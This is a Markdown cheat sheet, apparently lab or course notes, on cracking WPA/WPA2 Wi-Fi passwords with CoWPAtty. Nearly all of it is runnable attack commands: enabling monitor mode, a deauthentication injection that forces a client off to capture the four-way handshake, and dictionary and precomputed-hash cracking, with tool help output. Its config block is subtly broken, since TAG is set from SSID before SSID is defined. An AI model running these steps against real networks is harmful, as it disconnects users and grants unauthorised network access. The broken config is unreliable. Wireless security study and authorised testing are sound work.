# CoWPAtty Attack (WPA/WPA2)

Use CoWPAtty to crack the password in either dictionary mode (plaintext) or hash mode. The latter is quicker.

* Run `sudo apt-get install cowpatty` to install it

## Setup

```bash
# Install cowpatty/genpmk
sudo apt-get install cowpatty

# Build an environment file for convenience
vi config

export BSSID=9C:53:22:03:18:E1
export CHANNEL=3
export CLIENT=DC:A6:32:E9:B6:BD
export TAG=$SSID
export PCAP=$TAG-01.cap
export RAINBOW=$TAG-rainbow.lst
export SSID=wifu
export WORDLIST=/usr/share/john/password.lst

# Save and source it
source config
```

## Commands

```bash
# Start monitor mode
sudo airmon-ng start wlan0

# Start monitoring for APs
sudo airodump-ng wlan0mon

# Find target and collect BSSID,CHANNEL,CLIENT,SSID

# Stop monitoring
qq

# Create and source config file as noted above
# Start a screen session and do a horizonal split screen

# Restart monitoring but filtered with output saved to PCAP. Make sure CLIENT is found.
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap wlan0mon

# Do one deauth injection attack while still monitoring
sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon

# Wait for the four-way handshake to appear in airodump-ng window.
# Stop airodump-ng when it appears

# Check if four-way handshake is indeed valid
cowpatty -r $PCAP -c

# Crack the password in dictionary mode (slowest)
cowpatty -r $PCAP -f $WORDLIST -s $SSID

# Crack the password in hash mode (fastest)
## First - generate a word list. Include SSID since required.
genpmk -f $WORDLIST -d $RAINBOW -s $SSID

## Second - crack the password in hash mode
cowpatty -r $PCAP -d $RAINBOW -s $SSID
```
## References

* [cowpatty](https://www.willhackforsushi.com/?page_id=50)

```text
cowpatty -h
cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Usage: cowpatty [options]

        -f      Dictionary file
        -d      Hash file (genpmk)
        -r      Packet capture file
        -s      Network SSID (enclose in quotes if SSID includes spaces)
        -c      Check for valid 4-way frames, does not crack
        -h      Print this help information and exit
        -v      Print verbose information (more -v for more verbosity)
        -V      Print program version and exit
```

```text
genpmk -h
genpmk 1.3 - WPA-PSK precomputation attack. <jwright@hasborg.com>
Usage: genpmk [options]

        -f      Dictionary file
        -d      Output hash file
        -s      Network SSID
        -h      Print this help information and exit
        -v      Print verbose information (more -v for more verbosity)
        -V      Print program version and exit

After precomputing the hash file, run cowpatty with the -d argument.
```

![fourway-handshake](images/fourway-handshake.png)